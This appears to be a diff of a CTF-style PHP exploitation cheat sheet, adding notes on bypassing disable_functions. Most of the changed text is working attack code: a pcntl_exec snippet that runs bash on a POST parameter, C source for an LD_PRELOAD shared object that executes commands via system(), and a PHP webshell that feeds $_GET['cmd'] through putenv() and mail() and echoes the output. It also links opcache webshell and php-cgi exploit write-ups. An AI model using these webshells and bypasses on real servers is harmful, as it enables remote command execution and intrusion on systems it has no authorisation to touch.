@@ -30,7 +30,7 @@ http://www.0php.com/php_easter_egg.php
 # see what modules are enabled
 php -m
 
-# bypass write restrictions to webroot by overwrite cached index.php.bin
+# opcache bypass write restrictions to webroot by overwrite cached index.php.bin
 http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/
 
 # preg_replace
@@ -133,48 +133,49 @@ http://...?ctime=system&atime=id
 print_r(ini_get_all());
 ini_set('display_errors', '1');
 
+* howto use pcntl_exec
 $args = array('-c', $_POST['c']);
 print_r($args); // next line would return HTTP 500 without this line (?!)
 pcntl_exec('/bin/bash', $args);
 
-# disable_functions of plaidctf
-pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+* bypass disable_functions by overwriting memory through the procfs - plaidctf-2014 nightmares
 http://www.reddit.com/r/netsec/comments/2tyh93/php_disable_functions_procfs_bypass_ru/
 
-variant from 0ctf-2016 guestbook
-compile with gcc -c -fPIC a.c -o a.o && gcc a.o -shared -o a.so
+* bypass disable_functions via putenv() LD_PRELOAD and mail(). Need to upload .so and .php (see 0ctf-2016 guestbook https://blog.ka0labs.net/post/33/ or alictf-2016 homework https://github.com/tothi/ctfs/tree/master/alictf-2016/homework)
+upload a.so:
+# compile with gcc -c -fPIC a.c -o a.o && gcc a.o -shared -o a.so
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
 int getuid ()
 {
-char * en;
-char * buf = malloc (300);
-FILE * a;
-unsetenv( "LD_PRELOAD");
-a = fopen( "/var/www/.comm", "r");
-buf = fgets(buf, 100, a);
-write(2, buf, strlen(buf));
-fclose(a);
-remove("/var/www/.comm");
-rename("/var/www/a.so", "/var/www/b.so");
-buf = strcat(buf, "> /var/www/.comm1");
-system(buf);
-rename( "/var/www/b.so", "/var/www/a.so");
-free(buf);
-return 0;
+  char * en;
+  char * buf = malloc(300);
+  FILE * a;
+  unsetenv( "LD_PRELOAD");
+  a = fopen( "/tmp/cmd.txt", "r");
+  buf = fgets(buf, 100, a); // or buf = getenv("_evilcmd");
+  write(2, buf, strlen(buf)); // optional?
+  fclose(a);
+  remove("/tmp/cmd.txt");
+  rename("/var/www/a.so", "/var/www/b.so"); // shouldnt be required (we already unsetenv)
+  buf = strcat(buf, "> /tmp/out.txt");
+  system(buf);
+  rename( "/var/www/b.so", "/var/www/a.so");// shouldnt be required
+  free(buf);
+  return 0;
 } 
-upload ws.php:
-<?php
-putenv("LD_PRELOAD=/var/www/a.so");
-$a = fopen("/var/www/.comm", "w");
-fputs($a, $_GET["c"]);
-fclose($a);
-mail("a", "a", "a", "a");
-$a = fopen("/var/www/.comm1", "r");
-while (!feof($a))
-{$b = fgets($a); echo $b;}
-fclose($a);  ?> 
+upload blah.php:
+<?php putenv("LD_PRELOAD=/var/www/a.so");
+  $a = fopen("/tmp/cmd.txt", "w");
+  fputs($a, $_GET["cmd"]);
+  fclose($a); // or use putenv("_evilcmd=$_GET['cmd']");
+  mail("a@example.com", "", "", "");
+  $a = fopen("/tmp/out.txt", "r");
+  while (!feof($a))
+  {$b = fgets($a); echo $b;}
+  fclose($a); // or use show_source("/tmp/out.txt");
+?>
 
 # php-cgi
 http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
